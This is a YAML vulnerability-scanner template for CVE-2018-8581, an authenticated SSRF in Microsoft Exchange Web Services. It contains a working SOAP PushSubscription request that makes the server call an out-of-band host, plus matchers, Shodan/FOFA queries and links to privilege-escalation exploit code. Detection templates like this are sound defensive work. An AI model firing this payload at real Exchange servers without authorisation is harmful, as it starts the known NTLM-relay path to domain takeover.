http/cves/2018/CVE-2018-8581.yaml

id: CVE-2018-8581

info:
  name: Microsoft Exchange Server - SSRF Privilege Escalation
  author: daffainfo,WyAtu,Ridter
  severity: high
  description: |
    Microsoft Exchange Server contains an elevation of privilege vulnerability in the Exchange Web Services (EWS) PushSubscription feature. An authenticated attacker can exploit this SSRF vulnerability to force the Exchange server to make NTLM-authenticated HTTP requests to an arbitrary URL, which can be relayed to escalate privileges to Domain Admin.
  impact: |
    Successful exploitation allows an attacker with valid mailbox credentials to escalate privileges to Domain Administrator by relaying the Exchange server's NTLM authentication.
  remediation: |
    Apply the security updates from Microsoft. Additionally, remove the unnecessary high privileges from Exchange by removing the WriteDacl permission from the Exchange Windows Permissions group on the Domain object.
  reference:
    - https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/
    - https://www.thezdi.com/blog/2018/12/19/an-insincere-form-of-flattery-impersonating-users-on-microsoft-exchange
    - https://github.com/dirkjanm/privexchange/
    - https://github.com/Ridter/Exchange2domain
    - https://github.com/WyAtu/CVE-2018-8581
    - https://nvd.nist.gov/vuln/detail/CVE-2018-8581
    - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2018-8581
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 6.8
    cve-id: CVE-2018-8581
    cwe-id: CWE-918
    epss-score: 0.97435
    epss-percentile: 0.99968
    cpe: cpe:2.3:a:microsoft:exchange_server:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: microsoft
    product: exchange_server
    shodan-query: cpe:"cpe:2.3:a:microsoft:exchange_server"
    fofa-query: app="Microsoft-Exchange"
  tags: cve,cve2018,microsoft,exchange,ssrf,privesc,kev,ews

http:
  - raw:
      - |
        POST /EWS/Exchange.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        User-Agent: ExchangeServicesClient/0.0.0.0
        Authorization: Basic {{base64(username + ':' + password)}}

        <?xml version="1.0" encoding="UTF-8"?>
        <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
                       xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
                       xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
           <soap:Header>
              <t:RequestServerVersion Version="Exchange2016" />
           </soap:Header>
           <soap:Body>
              <m:Subscribe>
                 <m:PushSubscriptionRequest SubscribeToAllFolders="true">
                    <t:EventTypes>
                      <t:EventType>NewMailEvent</t:EventType>
                      <t:EventType>ModifiedEvent</t:EventType>
                      <t:EventType>MovedEvent</t:EventType>
                    </t:EventTypes>
                    <t:StatusFrequency>1</t:StatusFrequency>
                    <t:URL>{{interactsh-url}}</t:URL>
                 </m:PushSubscriptionRequest>
              </m:Subscribe>
           </soap:Body>
        </soap:Envelope>

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "SubscriptionId"
          - "NoError"
        condition: and

      - type: word
        part: interactsh_protocol
        words:
          - "http"

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        name: subscription-id
        part: body
        group: 1
        regex:
          - '<t:SubscriptionId>([^<]+)</t:SubscriptionId>'

      - type: kval
        part: header
        kval:
          - x_owa_version
